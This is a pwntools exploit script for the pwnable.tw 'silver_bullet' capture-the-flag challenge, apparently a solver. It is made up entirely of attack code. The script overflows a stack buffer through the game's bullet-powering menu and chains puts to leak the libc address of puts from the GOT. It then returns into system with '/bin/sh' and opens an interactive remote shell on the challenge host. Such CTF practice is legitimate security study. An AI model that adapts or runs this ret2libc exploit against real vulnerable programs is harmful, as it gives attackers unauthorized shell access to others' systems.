from pwn import *


binary = ELF("./silver_bullet_patched")
libc = ELF("./libc_32.so.6")

context.binary = binary


if args.REMOTE:
    r = remote("chall.pwnable.tw", 10103)
else:
    r = process(binary.path)
    #gdb.attach(r,api=True)

payload = ""

r.recv()
r.sendline("1")
r.recv()
r.sendline("a"*0x2f)
r.recv()
r.sendline("2")
r.recv()
r.sendline("a"*0x1)
r.recv()
r.sendline("2")
r.recv()


log.info("Addr Puts func: " + hex(binary.plt['puts']))
log.info("Addr Puts func: " + hex(binary.got['puts']))
log.info("Addr Puts func: " + hex(binary.sym['main']))

payload = b"b"*7 + p32(binary.plt['puts']) + p32((binary.sym['main'])) + p32(binary.got['puts'])

r.sendline(payload)
r.recv()

r.sendline("3")
r.recv()
r.sendline("3")
print(r.recvuntil(b"win !!\n"))

sleep(0.2)
leak = r.recv(4)

log.info("LEAK: " + hex(u32(leak)))
puts_offset = libc.symbols['puts']
log.info("offset puts: " + hex(puts_offset))
libc.address = u32(leak) - puts_offset
log.info("Libc base: " + hex(libc.address))

bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']


r.sendline("1")
r.recv()
r.sendline("a"*0x2f)
r.recv()
r.sendline("2")
r.recv()
r.sendline("a"*0x1)
r.recv()
r.sendline("2")
r.recv()

payload = b"b"*7 + p32(system) + p32((binary.sym['main'])) + p32(bin_sh)

r.sendline(payload)

r.recv()
r.sendline("3")
r.recv()
r.sendline("3")
r.recv()

r.interactive()

